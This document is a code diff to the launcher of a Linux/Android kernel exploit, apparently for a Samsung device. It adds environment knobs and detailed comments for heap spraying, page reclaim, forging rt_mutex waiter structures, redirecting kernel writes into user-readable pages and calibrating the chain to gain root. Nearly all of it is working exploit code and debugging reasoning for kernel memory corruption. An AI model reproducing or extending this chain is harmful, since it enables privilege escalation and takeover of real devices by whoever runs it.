@@ -171,6 +171,32 @@ static void append_reclaim_env_overrides(struct env_pair *environment,
       "IONSTACK_RECLAIM_PHYS_PFN_END",
       "IONSTACK_RECLAIM_LINEAR_SEGMENT_PAGES",
       "IONSTACK_RECLAIM_LINEAR_MAP_BASE",
+      /*
+       * IONSTACK_RECLAIM_CORRELATE -- without this the payload writes the SAME
+       * lock pattern into every ORDER3_SIZE chunk of skb_buf, so a hold that
+       * lands on the wrong chunk is indistinguishable from a correct one: the
+       * kernel still reads our wait_lock_word at fake_lock+0x00 and still
+       * behaves as if page_base were right, while every write it performs goes
+       * into a page we do not hold.  With it set, each chunk gets
+       *   0x12345000 + (chunk / ORDER3_SIZE) * 0x10000
+       * in lock->waiters.rb_root/rb_leftmost, so dump_reclaim_page_state()'s
+       * root= field names the chunk we actually hold.  See
+       * docs/PAINT_ORACLE_ANALYSIS.md section 10.
+       */
+      "IONSTACK_RECLAIM_CORRELATE",
+      /*
+       * 2026-10-06 -- the post-target search sprays up to
+       * POSTTARGET_MAX_SOCKETS sockets and then CLOSES every extra one, freeing
+       * their frag pages.  Only reclaim_sv[1] (socket #0) keeps its queue, so
+       * only socket #0's messages are reachable by
+       * scan_reclaim_queue_for_writes().  Setting MAX_SOCKETS=1 keeps every
+       * reclaim message in one queue: nothing is freed early (which also stops
+       * the walk from writing into a page that was already released) and the
+       * whole spray becomes scannable.
+       */
+      "IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS",
+      "IONSTACK_RECLAIM_POSTTARGET_SENDS",
+      "IONSTACK_RECLAIM_SENDS",
       "IONSTACK_EL1_CANDIDATE_GATE",
       "IONSTACK_EL1_MEMSTART",
       "IONSTACK_EL1_DRAM_START",
@@ -989,6 +1015,29 @@ static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
            18U + (attempt > 1 ? (attempt - 1U) * 2U : 0U));
   snprintf(posttarget_sends_value, sizeof(posttarget_sends_value), "%u",
            8192U + (attempt > 1 ? (attempt - 1U) * 1024U : 0U));
+  /*
+   * Honour an explicit IONSTACK_RECLAIM_POSTTARGET_* from the outer environment.
+   * spawn_child() applies the table with setenv(..., 1) in array order (LAST
+   * wins), and fixed_environment[] is copied in before
+   * append_reclaim_env_overrides() runs, so the whitelisted entry already wins
+   * here -- but keep these consistent so both spawn paths behave identically.
+   * MAX_SOCKETS=1 keeps the whole reclaim spray in one socket queue (nothing
+   * freed early, everything scannable) -- see scan_reclaim_queue_for_writes().
+   */
+  {
+    const char *pt_sends_env = getenv("IONSTACK_RECLAIM_POSTTARGET_SENDS");
+    if (pt_sends_env && *pt_sends_env) {
+      snprintf(posttarget_sends_value, sizeof(posttarget_sends_value), "%s",
+               pt_sends_env);
+    }
+  }
+  char max_sockets_value[16];
+  {
+    const char *pt_sockets_env =
+        getenv("IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS");
+    snprintf(max_sockets_value, sizeof(max_sockets_value), "%s",
+             (pt_sockets_env && *pt_sockets_env) ? pt_sockets_env : "32");
+  }
   environment[env_count++] =
       (struct env_pair){"IONSTACK_KASLR_BASE", base_value};
   environment[env_count++] = (struct env_pair){"IONSTACK_KS_COLLISIONS", "8"};
@@ -1010,7 +1059,7 @@ static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
       {"IONSTACK_RECLAIM_PRETARGET_LATE", "1"},
       {"IONSTACK_RECLAIM_POSTTARGET_SEARCH", "1"},
       {"IONSTACK_RECLAIM_POSTTARGET_SENDS", posttarget_sends_value},
-      {"IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS", "32"},
+      {"IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS", max_sockets_value},
       {"IONSTACK_RECLAIM_VALIDATE_CONTENT", "1"},
       {"IONSTACK_RECLAIM_REQUIRE_CONTENT", "1"},
       {"IONSTACK_STAGE", "fops-page-hold"},
@@ -1022,7 +1071,7 @@ static int spawn_holder(struct child_proc *child, uint64_t kaslr_base,
       {"IONSTACK_FOPS_PI_NODE_SAFE",
        fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"},
       {"IONSTACK_FOPS_PI_RB_SHAPE",
-       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"},
+       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "target-left"},
       /*
        * Owner mode was hardcoded to "none" together with
        * IONSTACK_T878U_ALLOW_OWNERLESS_PI=1.  That combination is exactly
@@ -1191,7 +1240,7 @@ static int __attribute__((unused)) spawn_capture(struct child_proc *child, unsig
         fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"};
     environment[env_count++] = (struct env_pair){
         "IONSTACK_EXPECT_FOPS_PI_RB_SHAPE",
-        fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"};
+        fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "target-left"};
     environment[env_count++] = (struct env_pair){
         "IONSTACK_EXPECT_FOPS_LOCK_OWNER_MODE", effective_owner_mode};
     environment[env_count++] = (struct env_pair){
@@ -2041,6 +2090,90 @@ static int spawn_pselect_root(struct child_proc *child,
   const char *paint_prio = getenv("IONSTACK_PAINT_PRIO");
   /* 1 = fill the whole sockaddr_storage with prio (offset-agnostic probe). */
   const char *paint_fill = getenv("IONSTACK_PAINT_FILL");
+  /*
+   * How many iovecs the paint sendmsg hands over.  8 makes
+   * rw_copy_check_uvector() do one 0x80-byte copy at waiter-0x58, which is what
+   * repaints waiter+0x00..0x28 (both rb_nodes) -- see sendmsg_paint_waiter().
+   * 1 is the legacy setting that leaves waiter+0x00..0x28 untouched.
+   */
+  const char *paint_iovlen = getenv("IONSTACK_PAINT_IOVLEN");
+  /*
+   * Round-5 bisect probes.
+   *
+   * spawn_child() below only forwards `environment[]`, so an IONSTACK_* name
+   * that is not listed there never reaches LD_PRELOAD=ionstack_preload.so --
+   * getenv() in the exploit just returns NULL.  The three probes added to
+   * main.c/util.c on 2026-10-03 were therefore silently inert until they were
+   * added to this table.  Keep this list in sync with every env the exploit
+   * actually reads.
+   */
+  const char *paint_waiter_task_mode =
+      getenv("IONSTACK_PAINT_WAITER_TASK_MODE");
+  const char *paint_lock_delta = getenv("IONSTACK_PAINT_LOCK_DELTA");
+  /*
+   * 2026-10-06 slot-calibration probes.  IONSTACK_PAINT_LOCK_FILL=1 writes
+   * paint_lock into every 8-byte slot 0x00..0x38 of the paint buffer, so
+   * whichever slot the walk really reads as waiter->lock, it reads fake_lock
+   * and rtmutex.c:585 must succeed *if the paint lands at all*.  The two
+   * *_SLOT knobs sweep one slot at a time.
+   */
+  const char *paint_lock_slot = getenv("IONSTACK_PAINT_LOCK_SLOT");
+  const char *paint_task_slot = getenv("IONSTACK_PAINT_TASK_SLOT");
+  const char *paint_lock_fill = getenv("IONSTACK_PAINT_LOCK_FILL");
+  /*
+   * IONSTACK_PAINT_FILL_TASK=lock restores the *pure* fill (waiter->task also
+   * becomes paint_lock), which reintroduces the sched/core.c:4606
+   * cpu_rq(fake_task->cpu) reboot.  Plain FILL keeps waiter->task = fake_task.
+   */
+  const char *paint_fill_task = getenv("IONSTACK_PAINT_FILL_TASK");
+  /*
+   * 2026-10-06 reclaim-fragment identity.  IONSTACK_RECLAIM_SCAN_QUEUE=1 drains
+   * the reclaim socket and reports which message's frag page the kernel wrote
+   * to; IONSTACK_RECLAIM_FRAG_SKIP_MSGS then aims the held-fragment oracle at
+   * that message on the next run.  See scan_reclaim_queue_for_writes().
+   */
+  const char *reclaim_scan_queue = getenv("IONSTACK_RECLAIM_SCAN_QUEUE");
+  const char *reclaim_scan_msgs = getenv("IONSTACK_RECLAIM_SCAN_MSGS");
+  const char *reclaim_frag_skip_msgs =
+      getenv("IONSTACK_RECLAIM_FRAG_SKIP_MSGS");
+  /*
+   * Per-message identity stamp (see RECLAIM_TAG_OFF in offset.h and
+   * scan_reclaim_queue_for_writes()).  Default off so every existing
+   * configuration is byte-for-byte unchanged.
+   */
+  const char *reclaim_tag = getenv("IONSTACK_RECLAIM_TAG");
+  /*
+   * Consumed by the two table entries near the end of the environment[] list.
+   * spawn_child() applies entries with setenv(..., 1) in array order (LAST
+   * wins), so the override must sit on the FINAL occurrence of the name -- see
+   * the comment there.  MAX_SOCKETS=1 is the setting that matters for the queue
+   * scan: with more sockets the extra socketpairs are closed right after the
+   * spray, which frees their frag pages and leaves only socket #0's queue
+   * reachable.
+   */
+  const char *reclaim_pt_max_sockets =
+      getenv("IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS");
+  const char *reclaim_pt_sends = getenv("IONSTACK_RECLAIM_POSTTARGET_SENDS");
+  /*
+   * The pre-target order-3 spray was hardcoded to 0 (see the comment on
+   * IONSTACK_RECLAIM_PRETARGET_HOLD below).  With it at 0, and with
+   * IONSTACK_RECLAIM_PRECREATE_SENDS also defaulting to 0, the ONLY
+   * payload-bearing pages in the exploit process are the 8192 post-target
+   * messages -- so the "hold a pre-target fragment to keep the slab page's
+   * order-3 buddy out of the way" shaping the design documents simply never
+   * happens.  Keep the default at 0 (byte-for-byte unchanged) but let the host
+   * turn it on without a rebuild.
+   */
+  const char *reclaim_pretarget_sends =
+      getenv("IONSTACK_RECLAIM_PRETARGET_SENDS");
+  const char *reclaim_precreate_sends =
+      getenv("IONSTACK_RECLAIM_PRECREATE_SENDS");
+  /* Durable fsync log mirror (see common.h / util.c). */
+  const char *log_mirror = getenv("IONSTACK_LOG_MIRROR");
+  const char *log_fsync = getenv("IONSTACK_LOG_FSYNC");
+  const char *log_file = getenv("IONSTACK_LOG_FILE");
+  const char *ring1_value_off = getenv("IONSTACK_RING1_VALUE_OFF");
+  const char *ring1_target_off = getenv("IONSTACK_RING1_TARGET_OFF");
   const char *insert_target_off = getenv("IONSTACK_INSERT_TARGET_OFF");
   const char *insert_value_off = getenv("IONSTACK_INSERT_VALUE_OFF");
   const char *effective_owner_mode =
@@ -2141,6 +2274,67 @@ static int spawn_pselect_root(struct child_proc *child,
        paint_prio && *paint_prio ? paint_prio : "2147483647"},
       {"IONSTACK_PAINT_FILL",
        paint_fill && *paint_fill ? paint_fill : "0"},
+      {"IONSTACK_PAINT_IOVLEN",
+       paint_iovlen && *paint_iovlen ? paint_iovlen : "8"},
+      /*
+       * Round-5 probes.  See the getenv() block above for why these have to be
+       * listed here at all.
+       *
+       * IONSTACK_PAINT_WAITER_TASK_MODE: waiter->task written by the sendmsg
+       *   paint.  "fake-task" (default) | "init-task".
+       * IONSTACK_PAINT_LOCK_DELTA: signed delta added to waiter->lock.
+       *   0x1cb0 == SCRATCH_OFF - LOCK_OFF makes waiter->lock point at an
+       *   otherwise all-zero area of the reclaimed page, i.e. a pristine
+       *   rt_mutex with owner/rb_node/rb_leftmost all NULL.  The walk then takes
+       *   the cleanest possible path and every store it makes lands inside
+       *   page offset (SCRATCH_OFF + SKB_DATA_DELTA) + {0,4,8,0x10,0x18}, which
+       *   dump_reclaim_page_state() prints as `scratch=`.
+       * IONSTACK_RING1_VALUE_OFF / _TARGET_OFF: payload-page offsets that
+       *   redirect the target-left shape's two rb_erase_cached() Case 1 stores
+       *   into the payload page so they become readable from userspace.
+       */
+      {"IONSTACK_PAINT_WAITER_TASK_MODE",
+       paint_waiter_task_mode && *paint_waiter_task_mode
+           ? paint_waiter_task_mode
+           : "fake-task"},
+      {"IONSTACK_PAINT_LOCK_DELTA",
+       paint_lock_delta && *paint_lock_delta ? paint_lock_delta : ""},
+      /*
+       * 2026-10-06 slot calibration + durable logging.  See the getenv() block
+       * above; anything missing from this table is silently inert.
+       */
+      {"IONSTACK_PAINT_LOCK_SLOT",
+       paint_lock_slot && *paint_lock_slot ? paint_lock_slot : "0x10"},
+      {"IONSTACK_PAINT_TASK_SLOT",
+       paint_task_slot && *paint_task_slot ? paint_task_slot : "0x08"},
+      {"IONSTACK_PAINT_LOCK_FILL",
+       paint_lock_fill && *paint_lock_fill ? paint_lock_fill : "0"},
+      {"IONSTACK_PAINT_FILL_TASK",
+       paint_fill_task && *paint_fill_task ? paint_fill_task : ""},
+      {"IONSTACK_RECLAIM_SCAN_QUEUE",
+       reclaim_scan_queue && *reclaim_scan_queue ? reclaim_scan_queue : "0"},
+      {"IONSTACK_RECLAIM_SCAN_MSGS",
+       reclaim_scan_msgs && *reclaim_scan_msgs ? reclaim_scan_msgs : "16384"},
+      {"IONSTACK_RECLAIM_FRAG_SKIP_MSGS",
+       reclaim_frag_skip_msgs && *reclaim_frag_skip_msgs
+           ? reclaim_frag_skip_msgs
+           : ""},
+      /*
+       * Per-message identity stamp.  Without it every reclaim message is a
+       * byte-identical copy of skb_buf, so "the kernel reads our payload at
+       * fake_lock" and "not one of the 8192 queued frag pages was written" can
+       * both be true and no oracle can tell them apart.  With it the queue scan
+       * names the messages it reads and reports which sequence numbers are
+       * absent from every queue -- i.e. which frag page we cannot see.
+       */
+      {"IONSTACK_RECLAIM_TAG", reclaim_tag && *reclaim_tag ? reclaim_tag : "0"},
+      {"IONSTACK_LOG_MIRROR", log_mirror && *log_mirror ? log_mirror : "1"},
+      {"IONSTACK_LOG_FSYNC", log_fsync && *log_fsync ? log_fsync : "1"},
+      {"IONSTACK_LOG_FILE", log_file && *log_file ? log_file : ""},
+      {"IONSTACK_RING1_VALUE_OFF",
+       ring1_value_off && *ring1_value_off ? ring1_value_off : "0"},
+      {"IONSTACK_RING1_TARGET_OFF",
+       ring1_target_off && *ring1_target_off ? ring1_target_off : "0"},
       {"IONSTACK_INSERT_TARGET_OFF",
        insert_target_off && *insert_target_off ? insert_target_off : "0"},
       {"IONSTACK_INSERT_VALUE_OFF",
@@ -2182,12 +2376,27 @@ static int spawn_pselect_root(struct child_proc *child,
       {"IONSTACK_RECLAIM_PFN_IDENTITY", "0"},
       {"IONSTACK_RECLAIM_RELEASE_PREPARE_EARLY", "1"},
       {"IONSTACK_RECLAIM_TARGET_LAST", "1"},
-      {"IONSTACK_RECLAIM_PRETARGET_SENDS", "0"},
+      {"IONSTACK_RECLAIM_PRETARGET_SENDS",
+       reclaim_pretarget_sends && *reclaim_pretarget_sends
+           ? reclaim_pretarget_sends
+           : "0"},
+      {"IONSTACK_RECLAIM_PRECREATE_SENDS",
+       reclaim_precreate_sends && *reclaim_precreate_sends
+           ? reclaim_precreate_sends
+           : "0"},
       {"IONSTACK_RECLAIM_PRETARGET_HOLD", "1"},
       {"IONSTACK_RECLAIM_PRETARGET_LATE", "1"},
       {"IONSTACK_RECLAIM_POSTTARGET_SEARCH", "1"},
-      {"IONSTACK_RECLAIM_POSTTARGET_SENDS", "8192"},
-      {"IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS", "32"},
+      /*
+       * spawn_child() applies these with setenv(..., 1) in array order, i.e.
+       * LAST WINS.  So the override has to live HERE, on the final occurrence of
+       * the name -- an earlier duplicate would simply be overwritten.
+       */
+      {"IONSTACK_RECLAIM_POSTTARGET_SENDS",
+       reclaim_pt_sends && *reclaim_pt_sends ? reclaim_pt_sends : "8192"},
+      {"IONSTACK_RECLAIM_POSTTARGET_MAX_SOCKETS",
+       reclaim_pt_max_sockets && *reclaim_pt_max_sockets ? reclaim_pt_max_sockets
+                                                        : "32"},
       {"IONSTACK_RECLAIM_VALIDATE_CONTENT", "1"},
       {"IONSTACK_RECLAIM_REQUIRE_CONTENT", "1"},
       {"IONSTACK_FOPS_PI_WAITERS",
@@ -2197,7 +2406,7 @@ static int spawn_pselect_root(struct child_proc *child,
       {"IONSTACK_FOPS_PI_NODE_SAFE",
        fops_pi_node_safe && *fops_pi_node_safe ? fops_pi_node_safe : "0"},
       {"IONSTACK_FOPS_PI_RB_SHAPE",
-       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "ghostlock-right"},
+       fops_pi_rb_shape && *fops_pi_rb_shape ? fops_pi_rb_shape : "target-left"},
       /*
        * Owner mode was hardcoded to "none" together with
        * IONSTACK_T878U_ALLOW_OWNERLESS_PI=1.  That combination is exactly
